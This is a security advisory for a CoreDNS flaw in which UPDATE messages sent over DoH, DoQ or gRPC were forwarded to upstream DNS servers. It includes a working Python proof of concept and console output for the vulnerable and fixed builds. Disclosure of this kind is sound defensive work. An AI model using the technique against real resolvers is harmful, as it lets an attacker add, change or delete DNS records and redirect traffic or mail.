# CoreDNS DoH/DoQ/gRPC bypass UPDATE rejection enforced on UDP/TCP

- CWE: CWE-441
- Packages: go:github.com/coredns/coredns

---

### Summary

CoreDNS accepted [RFC 2136](https://datatracker.ietf.org/doc/html/rfc2136) UPDATE messages over DoH, DoH3, DoQ, and DNS-over-gRPC, then allowed the `proxy`/`forward` plugin to send them unchanged to an upstream DNS server. UDP, TCP, and DoT rejected the same opcode before plugin dispatch.

If an update-capable upstream trusts CoreDNS's source address or authenticated connection instead of requiring end-to-end TSIG, an unauthenticated client can use CoreDNS to add, replace, or delete DNS records.

### Details

The affected listeners called `dns.Msg.Unpack` without the request policy used by the UDP/TCP server:

- [DoH and DoH3](https://github.com/coredns/coredns/blob/18a58b9e898ccd95c3f8ee72a37b95b3d1e3e928/plugin/pkg/doh/doh.go#L134-L155)
- [DoQ](https://github.com/coredns/coredns/blob/18a58b9e898ccd95c3f8ee72a37b95b3d1e3e928/core/dnsserver/server_quic.go#L212-L219)
- [DNS-over-gRPC](https://github.com/coredns/coredns/blob/18a58b9e898ccd95c3f8ee72a37b95b3d1e3e928/core/dnsserver/server_grpc.go#L176-L184)

CoreDNS routed the message using its Zone question without checking the opcode. [`forward`](https://github.com/coredns/coredns/blob/18a58b9e898ccd95c3f8ee72a37b95b3d1e3e928/plugin/forward/forward.go#L113-L118) then passed the original message to the [upstream](https://github.com/coredns/coredns/blob/18a58b9e898ccd95c3f8ee72a37b95b3d1e3e928/plugin/pkg/proxy/connect.go#L150-L167).

By contrast, [`dns.DefaultMsgAcceptFunc`](https://github.com/miekg/dns/blob/v1.1.72/acceptfunc.go#L33-L57) allows only QUERY and NOTIFY. The fix applies that policy to the raw header via [`dnsutil.UnpackRequest`](https://github.com/coredns/coredns/blob/530b0a5ff2ad68cc0421f10dd93568945cc671c9/plugin/pkg/dnsutil/message.go#L13-L23) before any affected transport dispatches the request.

### PoC

The reproducer starts a standard-library synthetic DNS upstream on loopback, sends an unsigned UPDATE over DoH, and reports whether the upstream received the record. It supports both UDP and TCP because the `forward` plugin may select either transport. It does not contact or modify a real authoritative server.

Clone the repository and build the server:

```bash
git clone git@github.com:coredns/coredns.git
cd coredns
git checkout d5e54040ffab9a5c12c6de27b66f59f62b385195 # latest pre-fix commit from main
go build -tags=grpcnotrace -o coredns .
```

Save this as `Corefile.poc`:

```text
https://.:8053 {
    bind 127.0.0.1
    tls plugin/tls/test_cert.pem plugin/tls/test_key.pem
    forward . 127.0.0.1:15354
}
```

Save this as `poc.py`:

```python
#!/usr/bin/env python3
import argparse
import http.client
import queue
import socket
import ssl
import struct
import threading

OPCODE_UPDATE = 5
TYPE_A = 1
CLASS_IN = 1

def encode_name(name):
    return b"".join(bytes((len(label),)) + label.encode() for label in name.rstrip(".").split(".")) + b"\x00"

def update_message():
    zone = encode_name("example.com.") + struct.pack("!HH", 6, CLASS_IN)
    update = (
        encode_name("foo.example.com.")
        + struct.pack("!HHIH", TYPE_A, CLASS_IN, 300, 4)
        + socket.inet_aton("192.0.2.123")
    )
    header = struct.pack("!HHHHHH", 0x1234, OPCODE_UPDATE << 11, 1, 0, 1, 0)
    return header + zone + update

def read_name(message, offset):
    labels = []
    end = None
    seen = set()
    while True:
        if offset >= len(message) or offset in seen:
            raise ValueError("invalid DNS name")
        seen.add(offset)
        length = message[offset]
        if length & 0xC0 == 0xC0:
            if offset + 1 >= len(message):
                raise ValueError("truncated compression pointer")
            if end is None:
                end = offset + 2
            offset = ((length & 0x3F) << 8) | message[offset + 1]
            continue
        offset += 1
        if length == 0:
            return ".".join(labels) + ".", end if end is not None else offset
        if length & 0xC0 or offset + length > len(message):
            raise ValueError("invalid DNS label")
        labels.append(message[offset : offset + length].decode("ascii"))
        offset += length

def question_end(message, count):
    offset = 12
    for _ in range(count):
        _, offset = read_name(message, offset)
        offset += 4
        if offset > len(message):
            raise ValueError("truncated question")
    return offset

def parse_update(message):
    _, flags, qdcount, _, nscount, _ = struct.unpack_from("!HHHHHH", message)
    if (flags >> 11) & 0xF != OPCODE_UPDATE or qdcount != 1 or nscount < 1:
        return None
    offset = question_end(message, qdcount)
    name, offset = read_name(message, offset)
    rrtype, rrclass, ttl, rdlength = struct.unpack_from("!HHIH", message, offset)
    offset += 10
    rdata = message[offset : offset + rdlength]
    if rrtype != TYPE_A or rrclass != CLASS_IN or len(rdata) != 4:
        return None
    return name, ttl, socket.inet_ntoa(rdata)

def response_for(message):
    ident, flags, qdcount, _, _, _ = struct.unpack_from("!HHHHHH", message)
    end = question_end(message, qdcount)
    response_flags = flags | 0x8000
    return struct.pack("!HHHHHH", ident, response_flags, qdcount, 0, 0, 0) + message[12:end]

def handle_message(message, peer, received):
    try:
        update = parse_update(message)
        response = response_for(message)
    except (ValueError, struct.error):
        return None
    if update is not None:
        received.put((peer, update))
    return response

def serve_udp(sock, received, stopped):
    while not stopped.is_set():
        try:
            message, peer = sock.recvfrom(65535)
        except socket.timeout:
            continue
        except OSError:
            return
        response = handle_message(message, peer, received)
        if response is not None:
            sock.sendto(response, peer)

def recv_exact(connection, size, stopped):
    data = bytearray()
    while len(data) < size and not stopped.is_set():
        try:
            chunk = connection.recv(size - len(data))
        except socket.timeout:
            continue
        if not chunk:
            return None
        data.extend(chunk)
    return bytes(data) if len(data) == size else None

def serve_tcp(sock, received, stopped):
    while not stopped.is_set():
        try:
            connection, peer = sock.accept()
        except socket.timeout:
            continue
        except OSError:
            return
        with connection:
            connection.settimeout(0.1)
            while not stopped.is_set():
                length = recv_exact(connection, 2, stopped)
                if length is None:
                    break
                message = recv_exact(connection, struct.unpack("!H", length)[0], stopped)
                if message is None:
                    break
                response = handle_message(message, peer, received)
                if response is not None:
                    connection.sendall(struct.pack("!H", len(response)) + response)

def send_doh(host, port, payload, timeout):
    context = ssl._create_unverified_context()
    connection = http.client.HTTPSConnection(host, port, timeout=timeout, context=context)
    try:
        connection.request(
            "POST",
            "/dns-query",
            body=payload,
            headers={"Content-Type": "application/dns-message"},
        )
        response = connection.getresponse()
        body = response.read()
        return response.status, len(body)
    finally:
        connection.close()

def main():
    parser = argparse.ArgumentParser(description="Probe whether CoreDNS forwards RFC 2136 UPDATE over DoH")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=8053)
    parser.add_argument("--upstream-host", default="127.0.0.1")
    parser.add_argument("--upstream-port", type=int, default=15354)
    parser.add_argument("--timeout", type=float, default=2.0)
    parser.add_argument("--expect", choices=("forwarded", "blocked", "either"), default="either")
    args = parser.parse_args()

    received = queue.Queue()
    stopped = threading.Event()
    udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp_sock.settimeout(0.1)
    udp_sock.bind((args.upstream_host, args.upstream_port))
    tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcp_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    tcp_sock.settimeout(0.1)
    tcp_sock.bind((args.upstream_host, args.upstream_port))
    tcp_sock.listen()
    threads = [
        threading.Thread(target=serve_udp, args=(udp_sock, received, stopped), daemon=True),
        threading.Thread(target=serve_tcp, args=(tcp_sock, received, stopped), daemon=True),
    ]
    for thread in threads:
        thread.start()

    payload = update_message()
    try:
        status, response_bytes = send_doh(args.host, args.port, payload, args.timeout)
        try:
            peer, update = received.get(timeout=args.timeout)
        except queue.Empty:
            peer = update = None
    finally:
        stopped.set()
        udp_sock.close()
        tcp_sock.close()
        for thread in threads:
            thread.join(timeout=1)

    print("payload=%d opcode=UPDATE record=foo.example.com. 300 IN A 192.0.2.123" % len(payload))
    print("http_status=%d response_bytes=%d" % (status, response_bytes))
    if update is None:
        result = "blocked"
        print("upstream_received_update=false")
    else:
        result = "forwarded"
        name, ttl, address = update
        print("upstream_received_update=true source=%s:%d" % peer)
        print("upstream_record=%s %d IN A %s" % (name, ttl, address))
    print("result=%s" % result)

    if args.expect != "either" and args.expect != result:
        raise SystemExit("expected %s, got %s" % (args.expect, result))

if __name__ == "__main__":
    main()
```

Start the vulnerable revision:

```sh
./coredns -conf Corefile.poc
```

In a second terminal, run the probe:

```console
$ python3 poc.py --expect forwarded
payload=60 opcode=UPDATE record=foo.example.com. 300 IN A 192.0.2.123
http_status=200 response_bytes=29
upstream_received_update=true source=127.0.0.1:52391
upstream_record=foo.example.com. 300 IN A 192.0.2.123
result=forwarded
```

The ephemeral source port varies. The output confirms that the upstream saw the complete UPDATE as a request originating from CoreDNS.

For comparison, build and start CoreDNS with the fix:

```sh
git checkout 530b0a5ff2ad68cc0421f10dd93568945cc671c9 # fix commit from main
go build -tags=grpcnotrace -o coredns-fixed .
./coredns-fixed -conf Corefile.poc
```

The same probe is rejected before reaching the synthetic upstream:

```console
$ python3 poc.py --expect blocked
payload=62 opcode=UPDATE record=foo.example.com. 300 IN A 192.0.2.123
http_status=400 response_bytes=16
upstream_received_update=false
result=blocked
```

### Impact

Exploitation requires all of the following:

- an attacker can reach a CoreDNS DoH, DoH3, DoQ, or DNS-over-gRPC listener
- the selected `proxy`/`forward` target accepts RFC 2136 UPDATE
- the upstream trusts CoreDNS's source address or connection and does not require an attacker-unknown TSIG

The upstream sees the UPDATE as originating from CoreDNS. A successful attack can redirect traffic, take over names, alter mail routing, or disrupt the writable zone. Requiring and validating end-to-end TSIG prevents the demonstrated attack.
